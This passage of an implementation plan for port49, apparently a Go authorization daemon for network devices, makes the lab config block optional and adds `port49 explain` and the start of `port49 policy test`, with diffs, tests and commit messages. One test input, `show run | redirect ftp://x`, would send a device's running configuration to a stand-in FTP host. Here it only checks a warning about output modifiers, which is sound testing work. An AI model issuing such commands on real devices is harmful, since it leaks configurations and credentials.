+func TestLoadWithoutALabBlock(t *testing.T) {
 	setKeyEnv(t)
 	invPath := write(t, "inventory.yaml", inv)
 	body := fmt.Sprintf(sample, invPath)
 	body = body[:strings.Index(body, "lab:")]
-	_, err := Load(write(t, "nolab.yaml", body))
-	if err == nil {
-		t.Fatal("a config without lab: must fail; there is no authorizer until plan 4")
+	c, err := Load(write(t, "nolab.yaml", body))
+	if err != nil {
+		t.Fatalf("a config without lab: loads: %v", err)
 	}
-	if !strings.Contains(err.Error(), "lab: block is required until the policy engine lands (plan 4)") {
-		t.Fatalf("error must name the missing block: %v", err)
+	if c.Lab != nil {
+		t.Fatalf("no lab: block is a nil Lab, got %+v", c.Lab)
 	}
 }
 
```

- [ ] **Step 2: Run it to see it fail**

Run: `go test ./internal/config/ -run LabBlock -count=1`
Expected: FAIL — `a config without lab: loads: config: lab: block is required until the policy engine lands (plan 4)`.

- [ ] **Step 3: Make the block optional, and nil-safe in `run`**

<!-- patch: internal/config/config.go -->
```diff
diff --git a/internal/config/config.go b/internal/config/config.go
index c235f92..4a5df04 100644
--- a/internal/config/config.go
+++ b/internal/config/config.go
@@ -59,9 +59,11 @@ type SeedToken struct {
 	Enable   bool   `yaml:"enable"`
 }
 
-// LabConfig is the stand-in authorizer's configuration. It is required until
-// the policy engine lands (plan 4): without it there is no authorizer at all,
-// and port49 never falls back to permitting everything.
+// LabConfig is the lab's measurement instrument (author.Lab): seeded tokens,
+// and the fixed answers the register entries vary. It is optional since the
+// policy engine landed (plan 4): without it a context with no blob is denied,
+// and every context the broker mints has one. With it, only the seeded
+// contexts get the lab's answers.
 type LabConfig struct {
 	SessionAttributes []string `yaml:"session_attributes"`
 	// CommandAttributes are attached to a PERMITTED per-command authorization
@@ -121,7 +123,7 @@ type TokenConfig struct {
 // The policy file is read once, at start, and the store is in memory: a
 // policy edit needs a restart, and a restart ends every live login context
 // and every unspent token — every operator logs in again (plan 3,
-// Question 3). Plan 4 brings reload.
+// Question 3). Reload is plan 7's, with policy refresh (roadmap).
 //
 // The slice has no revocation lever. To cut someone off, remove their subject
 // from the policy (or re-issue the CA) and restart; certificate revocation is
@@ -234,7 +236,8 @@ type Config struct {
 	Accounting     AccountingConfig
 	Session        SessionConfig
 	Token          TokenConfig
-	// Broker is nil when no broker: block is configured.
+	// Broker is nil when no broker: block is configured, and Lab when no lab:
+	// block is.
 	Broker *BrokerConfig
 	Lab    *LabConfig
 
@@ -364,18 +367,20 @@ func Load(path string) (Config, error) {
 	if err := resolveEnableUsernames(&c, f.Platforms); err != nil {
 		return Config{}, err
 	}
-	if c.Lab == nil {
-		return Config{}, fmt.Errorf("config: lab: block is required until the policy engine lands (plan 4)")
-	}
-	for i, t := range c.Lab.SeedTokens {
-		if t.NAS == "" || t.Username == "" {
-			return Config{}, fmt.Errorf("config: lab.seed_tokens[%d]: nas and username are both required", i)
+	// No lab: block is a production daemon: Lab stays nil, the policy engine
+	// answers every context the broker minted, and a context with no blob is
+	// denied — there is no instrument to answer it.
+	if c.Lab != nil {
+		for i, t := range c.Lab.SeedTokens {
+			if t.NAS == "" || t.Username == "" {
+				return Config{}, fmt.Errorf("config: lab.seed_tokens[%d]: nas and username are both required", i)
+			}
+		}
+		if len(c.Lab.SeedTokens) > 0 && c.Lab.SeedTokenFile == "" {
+			return Config{}, fmt.Errorf("config: lab.seed_token_file is required when lab.seed_tokens is non-empty: " +
+				"port49d mints each seed's secret at start and has to put it somewhere an operator can read " +
+				"and nothing else can — a 0600 file, never a stream")
 		}
-	}
-	if len(c.Lab.SeedTokens) > 0 && c.Lab.SeedTokenFile == "" {
-		return Config{}, fmt.Errorf("config: lab.seed_token_file is required when lab.seed_tokens is non-empty: " +
-			"port49d mints each seed's secret at start and has to put it somewhere an operator can read " +
-			"and nothing else can — a 0600 file, never a stream")
 	}
 
 	if f.Broker != nil {
```

<!-- patch: cmd/port49d/main.go -->
```diff
diff --git a/cmd/port49d/main.go b/cmd/port49d/main.go
index ae5ae89..e19387a 100644
--- a/cmd/port49d/main.go
+++ b/cmd/port49d/main.go
@@ -279,14 +279,17 @@ func run(cfgPath string) error {
 
 	// A context the broker minted names a compiled blob and is answered from it
 	// by the policy engine (plan 4). A context with no blob — the lab's seeds —
-	// is answered by the lab authorizer; config.Load refuses a config without
-	// it, so the fallback is never nil and port49 never falls back to
+	// is answered by the lab's instrument where port49d.yaml has a `lab:`
+	// block, and denied where it has none: port49 never falls back to
 	// permitting everything.
-	authz := &author.Engine{Store: st, Metrics: m, Fallback: &author.Lab{
-		SessionAttributes: cfg.Lab.SessionAttributes,
-		CommandAttributes: cfg.Lab.CommandAttributes,
-		DenyPrefixes:      cfg.Lab.DenyPrefixes,
-	}}
+	authz := &author.Engine{Store: st, Metrics: m}
+	if cfg.Lab != nil {
+		authz.Fallback = &author.Lab{
+			SessionAttributes: cfg.Lab.SessionAttributes,
+			CommandAttributes: cfg.Lab.CommandAttributes,
+			DenyPrefixes:      cfg.Lab.DenyPrefixes,
+		}
+	}
 	minter := token.NewMinter(st, log, rand.Reader, tagKey, time.Now, cfg.Token.CandidateCap)
 	// Plan 7's broker exposes Refresh, RevokeByPrincipal and RevokeBySID over
 	// HTTP; plan 3's serves /v1/tokens and /v1/config only, so nothing in this
@@ -313,7 +316,7 @@ func run(cfgPath string) error {
 	//
 	// One line per seed, JSON, written before the listener opens; the file is
 	// truncated at start so a restart cannot leave a spent token behind.
-	if len(cfg.Lab.SeedTokens) > 0 {
+	if cfg.Lab != nil && len(cfg.Lab.SeedTokens) > 0 {
 		logins, enables, err := mintSeeds(ctx, cfg, minter)
 		if err != nil {
 			stopSpool()
```

- [ ] **Step 4: Run the packages**

Run: `go test ./internal/config/ ./cmd/port49d/ -count=1 && go vet -tags lab ./tests/lab/...`
Expected: PASS; the lab harness still vets (its config keeps its `lab:` block).

- [ ] **Step 5: Commit**

```bash
git add internal/config/config.go internal/config/config_test.go cmd/port49d/main.go
git commit -m "feat: port49d runs without a lab: block

The lab: block configured the only authorizer port49d had; the policy
engine is the authorizer now, and the block is the lab's instrument
for seeded contexts. Without it Lab is nil, no seeds are minted, and a
context with no blob is denied.

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01KRDnCbmkhchGxXvV99W4mc"
```

---
### Task 15: `port49 explain`

**Files:**
- Create: `internal/policy/explain.go`, `cmd/port49/policy.go`
- Modify: `cmd/port49/main.go` (usage, the `explain` command)
- Test: `internal/policy/explain_test.go`, `cmd/port49/policy_test.go`

**Interfaces:**
- Consumes: `Decide`, `Caveats`, `ResolveSubject` (Tasks 10, 11); `admission.LoadFile`.
- Produces:
  - `type Explanation struct { Subject, Device, Platform, Command string; Resolution Resolution; NoGrants bool; Outcome engine.Outcome; WouldPermit, Caveats []string }`;
    `func (*Policy) Explain(subject, principal, device, line string, now time.Time) (Explanation, error)`;
    `func (Explanation) Render(w io.Writer, showAttributes bool)`.
  - `cmd/port49`: `type policyFiles struct{ policy, inventory string }` with `register(*flag.FlagSet)`
    and `load() (*policy.Policy, error)`; `func explainCmd(args []string, stdout, stderr io.Writer) int`.
  Tasks 16–19 add their commands to `cmd/port49/policy.go` beside it.

`port49 explain --policy FILE --inventory FILE (--subject NAME | --principal ID) --device NAME
[--command "LINE"] [--show-attributes]`. It names exactly one reason and the rule and role behind
it, and for a denied command every role whose permits would match it (spec §12). With no
`--command` it shows the session: the level, the ceiling, and each attribute with where it came
from and what it shadows (spec §6, "Diagnosing an unfamiliar vendor"). It states what the device
will not honor: a pipeline on a platform that applies modifiers itself, and on a session-only
platform any command, a revocation and a ceiling (spec §4, §5.6, §12; decision 21). It exits 0 for a
permit and for a deny — the answer is the output — and 1 when the files or a name do not load.

- [ ] **Step 1: Write the failing tests**

<!-- write: internal/policy/explain_test.go -->
```go
package policy

import (
	"bytes"
	"strings"
	"testing"

	"github.com/rhwendt/port49/internal/decision"
)

func explained(t *testing.T, p *Policy, subject, principal, device, line string, attrs bool) (Explanation, string) {
	t.Helper()
	e, err := p.Explain(subject, principal, device, line, noon)
	if err != nil {
		t.Fatal(err)
	}
	var buf bytes.Buffer
	e.Render(&buf, attrs)
	return e, buf.String()
}

func mustContain(t *testing.T, out string, want ...string) {
	t.Helper()
	for _, w := range want {
		if !strings.Contains(out, w) {
			t.Errorf("explain output lacks %q:\n%s", w, out)
		}
	}
}

// explain names exactly one reason and the rule and role behind it, and for a
// denied command, the roles that would permit it (spec §12).
func TestExplainNamesOneReasonAndWhoWouldPermit(t *testing.T) {
	p := spec11(t, spec11Raw(t))
	e, out := explained(t, p, "noc_tier1", "", "leaf-01", "reload", false)
	if e.Outcome.Reason != decision.NoRuleMatched {
		t.Fatalf("%+v", e.Outcome)
	}
	mustContain(t, out, "deny no_rule_matched", "rule        no permit matches", "permitted by network_admin",
		"grants      all_devices [read_only no_disruptive]; dc_fabric [interface_tech] expires 2026-12-01T00:00:00.000Z")
	_, out = explained(t, p, "noc_tier1", "", "srx-fw-04", "show chassis cluster status", false)
	mustContain(t, out, "deny no_permit_dominates_deny",
		"rule        show chassis cluster ** (cve_2026_xxxx) [3 3 3 0]",
		"permit      show ** (read_only) [3 0 0 0] does not dominate it",
		"cve_2026_xxxx (attached by srx_unpatched)",
		"permitted by cve_2026_xxxx_assess, network_admin, read_only")
}

// explain says what the device will not honor rather than reporting a
// decision it will not see (spec §4, §5.6, §12): a pipeline on a platform that
// applies modifiers itself, and any command, a revocation or a ceiling on a
// platform that authorizes sessions only.
func TestExplainSaysWhatTheDeviceWillNotHonor(t *testing.T) {
	p := spec11(t, spec11Raw(t))
	_, out := explained(t, p, "netops_admins", "", "leaf-01", "show run | redirect ftp://x", false)
	mustContain(t, out, "permit permit_dominates", "note: arista_eos applies output modifiers itself")
	_, out = explained(t, p, "svc_oxidized", "", "srx-fw-04", "show chassis hardware", false)
	mustContain(t, out, "note: juniper_junos does not send per-command authorization",
		"a revocation or a session ceiling does not reach a live session")
	_, out = explained(t, p, "noc_tier1", "", "srx-fw-22", "", false)
	mustContain(t, out, "srx_unpatched selected this device because its version could not be compared")
}

// With no command, explain shows what the login would be told, each attribute
// with where it came from (spec §6, "Diagnosing an unfamiliar vendor").
func TestExplainShowsTheSessionAttributes(t *testing.T) {
	p := spec11(t, spec11Raw(t))
	_, out := explained(t, p, "svc_oxidized", "", "leaf-01", "", false)
	mustContain(t, out, "permit context_matched (session)", "level       admin; max_privilege none",
		"priv-lvl=15", "(mandatory)  <- platform arista_eos, level admin")
	_, out = explained(t, p, "noc_tier1", "", "leaf-01", "show version", true)
	mustContain(t, out, "permit permit_dominates", "session attributes that would be returned:", "priv-lvl=7")
}

// A principal with no subject and a subject with no grant on the device are
// no_grants_matched; a device not in inventory is an error, not a denial.
func TestExplainNoGrants(t *testing.T) {
	p := spec11(t, spec11Raw(t))
	_, out := explained(t, p, "", "user:mallory@example.com", "leaf-01", "show version", false)
	mustContain(t, out, "deny no_grants_matched")
	_, out = explained(t, p, "security_ir", "", "leaf-01", "show version", false)
	mustContain(t, out, "deny no_grants_matched", "security_ir holds no grant whose scope selects leaf-01")
	if _, err := p.Explain("noc_tier1", "", "nowhere", "show version", noon); err == nil {
		t.Fatal("a device not in inventory is an error")
	}
	if _, err := p.Explain("nobody", "", "leaf-01", "show version", noon); err == nil {
		t.Fatal("an undeclared subject is an error")
	}
}
```

<!-- write: cmd/port49/policy_test.go -->
```go
package main

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// policyFixture writes a small policy and inventory and returns their paths.
func policyFixture(t *testing.T) (pol, inv string) {
	t.Helper()
	dir := t.TempDir()
	pol = filepath.Join(dir, "policy.yaml")
	inv = filepath.Join(dir, "inventory.yaml")
	if err := os.WriteFile(pol, []byte(`
scopes: [{name: all_devices, match: {}}]
roles:
  - {name: read_only, privilege: readonly, permit: [show **]}
  - {name: no_reload, deny: [reload **]}
  - {name: admin, privilege: admin, permit: ["**"]}
subjects:
  - {name: noc, identity: "user:noc@example.com", username: noc, token_ttl: 60s}
  - {name: ops, identity: "user:ops@example.com", username: ops, token_ttl: 60s}
grants:
  - {subject: noc, scope: all_devices, roles: [read_only, no_reload]}
  - {subject: ops, scope: all_devices, roles: [admin]}
tests:
  - {subject: noc, device: leaf-01, command: "show version", expect: permit}
  - {subject: noc, device: leaf-01, command: "reload", expect: deny}
`), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(inv, []byte(`
devices:
  - {name: leaf-01, platform: arista_eos, addresses: [10.0.0.1]}
key_groups:
  - {match: {cidr: 10.0.0.0/8}, key_ref: k}
`), 0o600); err != nil {
		t.Fatal(err)
	}
	return pol, inv
}

// `port49 explain` prints the one reason and the roles that would permit a
// denied command, from the files alone.
func TestExplainPrintsTheDecision(t *testing.T) {
	pol, inv := policyFixture(t)
	var out, errb bytes.Buffer
	code := run([]string{"explain", "--policy", pol, "--inventory", inv, "--subject", "noc", "--device", "leaf-01",
		"--command", "reload now"}, &out, &errb)
	if code != 0 || !strings.Contains(out.String(), "deny no_rule_matched") || !strings.Contains(out.String(), "permitted by admin") {
		t.Fatalf("code %d\n%s%s", code, out.String(), errb.String())
	}
	out.Reset()
	code = run([]string{"explain", "--policy", pol, "--inventory", inv, "--principal", "user:ops@example.com",
		"--device", "leaf-01"}, &out, &errb)
	if code != 0 || !strings.Contains(out.String(), "priv-lvl=15") {
		t.Fatalf("session: code %d\n%s%s", code, out.String(), errb.String())
	}
}

func TestExplainRefusesAnIncompleteAsk(t *testing.T) {
	pol, inv := policyFixture(t)
	var out, errb bytes.Buffer
	if code := run([]string{"explain", "--policy", pol, "--inventory", inv, "--device", "leaf-01"}, &out, &errb); code != 2 {
		t.Fatalf("no subject or principal: code %d", code)
	}
	if code := run([]string{"explain", "--policy", pol, "--subject", "noc", "--device", "leaf-01"}, &out, &errb); code != 1 ||
		!strings.Contains(errb.String(), "--inventory") {
		t.Fatalf("no inventory: code %d %s", code, errb.String())
	}
}
```

- [ ] **Step 2: Run them to see them fail**

Run: `go test ./internal/policy/ ./cmd/port49/ -count=1`
Expected: FAIL to build — `undefined: Explanation`; `cmd/port49`'s test fails with exit code 2
from `run`, which does not know `explain`.

- [ ] **Step 3: Write the explanation and the command**

<!-- write: internal/policy/explain.go -->
```go
package policy

import (
	"errors"
	"fmt"
	"io"
	"sort"
	"strings"
	"time"

	"github.com/rhwendt/port49/internal/decision"
	"github.com/rhwendt/port49/internal/engine"
)

// Explanation is `port49 explain`'s answer (spec §12): one hypothetical
// decision, with exactly one reason, the rule and role behind it, the roles
// that would permit a denied command, and what the device will not honor.
type Explanation struct {
	Subject, Device, Platform string
	// Command is empty for a session: what the login would be told.
	Command    string
	Resolution Resolution
	// NoGrants is no_grants_matched: nothing else is filled in.
	NoGrants bool
	Outcome  engine.Outcome
	// WouldPermit names the roles, held or not, whose permits alone match a
	// denied command on this platform: what to ask for, or what a deny beats.
	WouldPermit []string
	Caveats     []string
}

// Explain resolves a subject (or a principal) on a device and decides one
// command line, or the session when line is empty, with the evaluator the
// daemon runs.
func (p *Policy) Explain(subject, principal, device, line string, now time.Time) (Explanation, error) {
	d, ok := p.device(device)
	if !ok {
		return Explanation{}, fmt.Errorf("device %q is not in the inventory", device)
	}
	if principal != "" {
		name, ok := p.byID[principal]
		if !ok {
			return Explanation{Subject: principal, Device: device, Platform: d.Platform, Command: line, NoGrants: true}, nil
		}
		subject = name
	}
	if _, ok := p.subs[subject]; !ok {
		return Explanation{}, fmt.Errorf("subject %q is not declared", subject)
	}
	e := Explanation{Subject: subject, Device: device, Platform: d.Platform, Command: line}
	dialect := p.dialect(d.Platform)
	if line == "" {
		res, err := p.ResolveSubject(subject, d, now)
		if errors.Is(err, ErrNoGrants) {
			e.NoGrants = true
			return e, nil
		}
		if err != nil {
			return e, err
		}
		e.Resolution = res
		e.Caveats = Caveats(d.Platform, dialect, engine.Outcome{})
		return e, nil
	}
	res, o, err := p.Decide(subject, "", d, line, now)
	if errors.Is(err, ErrNoGrants) {
		e.NoGrants = true
		return e, nil
	}
	if err != nil {
		return e, err
	}
	e.Resolution, e.Outcome = res, o
	e.Caveats = Caveats(d.Platform, dialect, o)
	if !o.Permit {
		e.WouldPermit = p.wouldPermit(line, d.Platform)
	}
	return e, nil
}

// wouldPermit lists every role whose permits alone match the command on this
// platform, compiled as the daemon would compile them. A permit naming a class
// the platform does not define cannot match there and is skipped.
func (p *Policy) wouldPermit(line, platformName string) []string {
	dialect := p.dialect(platformName)
	raw := CommandRaw(line)
	var out []string
	for name, r := range p.roles {
		// The platform field names no device here; Compile only needs one.
		b := engine.Blob{Version: engine.Version, Platform: "explain", Classes: dialect.EntityClasses,
			Normalize: engine.Normalize{PipeToken: dialect.PipeToken, StripCR: dialect.StripCR}}
		for _, rule := range r.Permit {
			if !missingClass(rule, dialect.EntityClasses) {
				b.Rules = append(b.Rules, engine.Rule{Verdict: engine.Permit, Rule: rule, Role: name})
			}
		}
		if prog, err := engine.Compile(b); err == nil && len(prog.Command(raw).Permits) > 0 {
			out = append(out, name)
		}
	}
	sort.Strings(out)
	return out
}

func missingClass(rule string, classes map[string][]string) bool {
	terms, err := engine.ParseRule(rule)
	if err != nil {
		return true
	}
	for _, t := range terms {
		if t.Kind == engine.Class {
			if _, ok := classes[t.Text]; !ok {
				return true
			}
		}
	}
	return false
}

// Render writes the explanation for a person: the verdict and its one reason
// first, then what it rests on.
func (e Explanation) Render(w io.Writer, showAttributes bool) {
	if e.NoGrants {
		fmt.Fprintf(w, "deny %s\n  %s holds no grant whose scope selects %s (%s); attached roles never add a "+
			"device (spec §5.5)\n", decision.NoGrantsMatched, e.Subject, e.Device, e.Platform)
		return
	}
	r := e.Resolution
	o := e.Outcome
	if e.Command == "" {
		fmt.Fprintf(w, "permit %s (session)\n", decision.ContextMatched)
	} else if o.Permit {
		fmt.Fprintf(w, "permit %s\n", o.Reason)
	} else {
		fmt.Fprintf(w, "deny %s\n", o.Reason)
	}
	fmt.Fprintf(w, "  subject     %s\n  device      %s (%s)\n", e.Subject, e.Device, e.Platform)
	var grants []string
	for _, g := range r.Grants {
		s := g.Scope + " [" + strings.Join(g.Roles, " ") + "]"
		if g.Expires != "" {
			s += " expires " + g.Expires
		}
		grants = append(grants, s)
	}
	fmt.Fprintf(w, "  grants      %s\n", strings.Join(grants, "; "))
	var roles []string
	for _, name := range r.Roles {
		if scopes, ok := r.Attached[name]; ok {
			name += " (attached by " + strings.Join(scopes, ", ") + ")"
		}
		roles = append(roles, name)
	}
	fmt.Fprintf(w, "  roles       %s\n", strings.Join(roles, ", "))
	level := r.Level
	if level == "" {
		level = "(none)"
	}
	ceiling := "none"
	if r.Ceiling != "" {
		ceiling = fmt.Sprintf("%s (priv-lvl %d)", r.Ceiling, r.MaxPrivilege)
	}
	fmt.Fprintf(w, "  level       %s; max_privilege %s\n", level, ceiling)
	for _, s := range r.Incomparable {
		fmt.Fprintf(w, "  scope       %s selected this device because its version could not be compared (spec §5.5)\n", s)
	}
	if e.Command != "" {
		fmt.Fprintf(w, "  command     %s\n", e.Command)
		switch o.Reason {
		case decision.PermitDominates:
			fmt.Fprintf(w, "  rule        %s (%s) %v\n", o.Decided.Rule, o.Decided.Role, o.Decided.Specificity)
			if o.Deny != nil {
				fmt.Fprintf(w, "  overrides   %s (%s) %v: the permit dominates it at every position\n",
					o.Deny.Rule, o.Deny.Role, o.Deny.Specificity)
			}
		case decision.NoPermitDominatesDeny:
			fmt.Fprintf(w, "  rule        %s (%s) %v\n", o.Deny.Rule, o.Deny.Role, o.Deny.Specificity)
			for _, pm := range o.Permits {
				fmt.Fprintf(w, "  permit      %s (%s) %v does not dominate it\n", pm.Rule, pm.Role, pm.Specificity)
			}
		case decision.PipeStageDenied:
			fmt.Fprintf(w, "  rule        %s (%s) %v permits the command\n", o.Decided.Rule, o.Decided.Role,
				o.Decided.Specificity)
			fmt.Fprintf(w, "  stage       %d, %q, matches no pipe permit\n", o.Stage, strings.Join(o.Pipeline[o.Stage-1], " "))
		case decision.NoRuleMatched:
			fmt.Fprintf(w, "  rule        no permit matches\n")
		}
		if !o.Permit {
			wp := "none"
			if len(e.WouldPermit) > 0 {
				wp = strings.Join(e.WouldPermit, ", ")
			}
			fmt.Fprintf(w, "  permitted by %s\n", wp)
		}
	}
	if showAttributes || e.Command == "" {
		fmt.Fprintf(w, "session attributes that would be returned:\n")
		if len(r.Attributes) == 0 {
			fmt.Fprintf(w, "  (none)\n")
		}
		for _, a := range r.Attributes {
			kind := "optional"
			if engine.Mandatory(a.Attribute) {
				kind = "mandatory"
			}
			fmt.Fprintf(w, "  %-32s (%s)  <- %s\n", a.Attribute, kind, a.Source)
			for _, s := range a.Shadows {
				fmt.Fprintf(w, "  %-32s    shadows %s\n", "", s)
			}
		}
	}
	for _, c := range e.Caveats {
		fmt.Fprintf(w, "note: %s\n", c)
	}
}
```

<!-- write: cmd/port49/policy.go -->
```go
package main

import (
	"flag"
	"fmt"
	"io"
	"time"

	"github.com/rhwendt/port49/internal/admission"
	"github.com/rhwendt/port49/internal/policy"
)

// policyFiles are the two files every policy tool reads: the policy and the
// inventory it is checked against (spec §10, §12). The tools run offline, as
// CI runs them; they never ask a broker.
type policyFiles struct{ policy, inventory string }

func (f *policyFiles) register(fs *flag.FlagSet) {
	fs.StringVar(&f.policy, "policy", "", "the policy file")
	fs.StringVar(&f.inventory, "inventory", "", "the inventory file the daemon admits from (inventory_file)")
}

func (f *policyFiles) load() (*policy.Policy, error) {
	if f.policy == "" || f.inventory == "" {
		return nil, fmt.Errorf("--policy and --inventory are both required")
	}
	inv, err := admission.LoadFile(f.inventory)
	if err != nil {
		return nil, err
	}
	return policy.Load(f.policy, policy.Env{Devices: inv.Devices})
}

// explainCmd resolves a hypothetical decision and prints exactly one reason
// (spec §12). It exits 0 whether the answer is permit or deny: the answer is
// the output, and an error is a policy or a name that did not load.
func explainCmd(args []string, stdout, stderr io.Writer) int {
	fs := flag.NewFlagSet("port49 explain", flag.ContinueOnError)
	fs.SetOutput(stderr)
	var files policyFiles
	files.register(fs)
	subject := fs.String("subject", "", "the subject, by its name in the policy")
	principal := fs.String("principal", "", "or the principal, e.g. user:alice@example.com")
	device := fs.String("device", "", "the device, by its inventory name")
	command := fs.String("command", "", "the command line, quoted; omit it to see the session")
	attrs := fs.Bool("show-attributes", false, "show the session attributes and where each came from")
	if err := fs.Parse(args); err != nil {
		return 2
	}
	if (*subject == "") == (*principal == "") || *device == "" || fs.NArg() != 0 {
		fmt.Fprint(stderr, usage)
		return 2
	}
	p, err := files.load()
	if err != nil {
		fmt.Fprintln(stderr, "port49 explain:", err)
		return 1
	}
	e, err := p.Explain(*subject, *principal, *device, *command, time.Now())
	if err != nil {
		fmt.Fprintln(stderr, "port49 explain:", err)
		return 1
	}
	e.Render(stdout, *attrs)
	return 0
}
```

<!-- patch: cmd/port49/main.go -->
```diff
diff --git a/cmd/port49/main.go b/cmd/port49/main.go
index d04b68c..4efee61 100644
--- a/cmd/port49/main.go
+++ b/cmd/port49/main.go
@@ -1,9 +1,11 @@
-// Command port49 is the operator's CLI for the vertical slice (design §17,
-// "Client libraries"; §19 step 3). `port49 login` starts the agent that holds
-// the session — one mutual-TLS connection to the broker — and `port49 token
-// DEVICE` mints through it, fresh every time. Plan 9 builds the rest: `port49
-// ssh` with host-key verification, the OIDC client, and a key held on a
-// hardware token.
+// Command port49 is the operator's CLI (design §17, "Client libraries"; §19
+// step 3). `port49 login` starts the agent that holds the session — one
+// mutual-TLS connection to the broker — and `port49 token DEVICE` mints
+// through it, fresh every time. The policy tools of spec §12 (`explain`,
+// `policy test`, `policy replay`, `access review`, `grants remove`) read a
+// policy file and an inventory file offline and need no broker. Plan 9 builds
+// the rest: `port49 ssh` with host-key verification, the OIDC client, and a
+// key held on a hardware token.
 package main
 
 import (
@@ -30,6 +32,8 @@ import (
 const usage = `usage:
   port49 login --broker URL --cert FILE --key FILE --broker-ca FILE [--socket PATH]
   port49 token [--enable] [--ttl DURATION] [--json] [--socket PATH] DEVICE
+  port49 explain --policy FILE --inventory FILE (--subject NAME | --principal ID) --device NAME
+                 [--command "LINE"] [--show-attributes]
 `
 
 func main() { os.Exit(run(os.Args[1:], os.Stdout, os.Stderr)) }
@@ -47,6 +51,8 @@ func run(args []string, stdout, stderr io.Writer) int {
 	case "agent":
 		// What login starts; not for typing.
 		return agentMain(args[1:], stderr)
+	case "explain":
+		return explainCmd(args[1:], stdout, stderr)
 	}
 	fmt.Fprint(stderr, usage)
 	return 2
```

- [ ] **Step 4: Run the packages**

Run: `go test ./internal/policy/ ./cmd/port49/ -count=1 && go vet ./cmd/...`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add internal/policy/explain.go internal/policy/explain_test.go cmd/port49/
git commit -m "feat: port49 explain

Resolves a hypothetical decision from the policy and inventory files
and names exactly one reason, the rule and role behind it, and the
roles that would permit a denied command (spec §12). Says what the
device will not honor: a pipeline a platform applies itself, and on a
session-only platform any command, revocation or ceiling. With no
command, shows the session attributes and where each came from.

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01KRDnCbmkhchGxXvV99W4mc"
```

---

### Task 16: `port49 policy test`

**Files:**
- Modify: `cmd/port49/policy.go`, `cmd/port49/main.go`
- Test: modify `cmd/port49/policy_test.go`

**Interfaces:**
- Consumes: `policyFiles.load` (Task 15); `Policy.Lint`, `Policy.RunTests` (Task 11).
- Produces: `func policyCmd(args []string, stdout, stderr io.Writer) int` (the `port49 policy`
  dispatcher; Task 17 adds `replay` to it) and `func policyTest(args []string, stdout, stderr io.Writer) int`.

`port49 policy test --policy FILE --inventory FILE` is the CI gate (spec §11, §12): every load-time
check is a failure, then each `report:` line is a lint finding (not a failure), then one `PASS` or
`FAIL` line per test with its caveats, then the count. It exits 1 if the policy does not load or
any test fails.

- [ ] **Step 1: Write the failing tests**

<!-- patch: cmd/port49/policy_test.go -->
```diff
diff --git a/cmd/port49/policy_test.go b/cmd/port49/policy_test.go
index 54f4cff..fbb1a67 100644
--- a/cmd/port49/policy_test.go
+++ b/cmd/port49/policy_test.go
@@ -72,3 +72,41 @@ func TestExplainRefusesAnIncompleteAsk(t *testing.T) {
 		t.Fatalf("no inventory: code %d %s", code, errb.String())
 	}
 }
+
+// `port49 policy test` passes a policy whose tests pass, and fails one whose
+// test does not, naming it.
+func TestPolicyTestIsACIGate(t *testing.T) {
+	pol, inv := policyFixture(t)
+	var out, errb bytes.Buffer
+	if code := run([]string{"policy", "test", "--policy", pol, "--inventory", inv}, &out, &errb); code != 0 ||
+		!strings.Contains(out.String(), "PASS noc on leaf-01: \"reload\" -> deny no_rule_matched") ||
+		!strings.Contains(out.String(), "2 tests, 0 failed") {
+		t.Fatalf("code %d\n%s%s", code, out.String(), errb.String())
+	}
+	raw, _ := os.ReadFile(pol)
+	if err := os.WriteFile(pol, []byte(strings.Replace(string(raw), `command: "reload", expect: deny`,
+		`command: "reload", expect: permit`, 1)), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	out.Reset()
+	if code := run([]string{"policy", "test", "--policy", pol, "--inventory", inv}, &out, &errb); code != 1 ||
+		!strings.Contains(out.String(), "FAIL noc on leaf-01: \"reload\" -> deny no_rule_matched, want permit") {
+		t.Fatalf("code %d\n%s", code, out.String())
+	}
+}
+
+// A policy that fails a load-time check fails the gate, with the check's
+// message, before any test runs: here, a class the inventory's one platform
+// does not define (spec §4).
+func TestPolicyTestFailsAPolicyThatDoesNotLoad(t *testing.T) {
+	pol, inv := policyFixture(t)
+	raw, _ := os.ReadFile(pol)
+	if err := os.WriteFile(pol, []byte(strings.Replace(string(raw), "permit: [show **]", "permit: [interface @uplinks]", 1)), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	var out, errb bytes.Buffer
+	if code := run([]string{"policy", "test", "--policy", pol, "--inventory", inv}, &out, &errb); code != 1 ||
+		!strings.Contains(errb.String(), "@uplinks, which arista_eos does not define") || out.Len() != 0 {
+		t.Fatalf("code %d\nstdout %s\nstderr %s", code, out.String(), errb.String())
+	}
+}
```

- [ ] **Step 2: Run them to see them fail**

Run: `go test ./cmd/port49/ -run PolicyTest -count=1`
Expected: FAIL — `code 2` (the usage), since `run` does not know `policy`.

- [ ] **Step 3: Write the command**

<!-- patch: cmd/port49/policy.go -->
```diff
diff --git a/cmd/port49/policy.go b/cmd/port49/policy.go
index 0e5ed74..4d09eb4 100644
--- a/cmd/port49/policy.go
+++ b/cmd/port49/policy.go
@@ -64,3 +64,75 @@ func explainCmd(args []string, stdout, stderr io.Writer) int {
 	e.Render(stdout, *attrs)
 	return 0
 }
+
+// policyCmd runs `port49 policy SUBCOMMAND`.
+func policyCmd(args []string, stdout, stderr io.Writer) int {
+	if len(args) == 0 {
+		fmt.Fprint(stderr, usage)
+		return 2
+	}
+	switch args[0] {
+	case "test":
+		return policyTest(args[1:], stdout, stderr)
+	}
+	fmt.Fprint(stderr, usage)
+	return 2
+}
+
+// policyTest is the CI gate (spec §11, §12): it loads the policy against the
+// inventory — every load-time check is a failure here — prints what CI must
+// report without refusing, then runs the file's tests. It exits 1 if the
+// policy does not load or any test fails.
+func policyTest(args []string, stdout, stderr io.Writer) int {
+	fs := flag.NewFlagSet("port49 policy test", flag.ContinueOnError)
+	fs.SetOutput(stderr)
+	var files policyFiles
+	files.register(fs)
+	if err := fs.Parse(args); err != nil {
+		return 2
+	}
+	p, err := files.load()
+	if err != nil {
+		fmt.Fprintln(stderr, "port49 policy test:", err)
+		return 1
+	}
+	for _, f := range p.Lint() {
+		fmt.Fprintf(stdout, "report: %s: %s\n", f.Kind, f.Message)
+	}
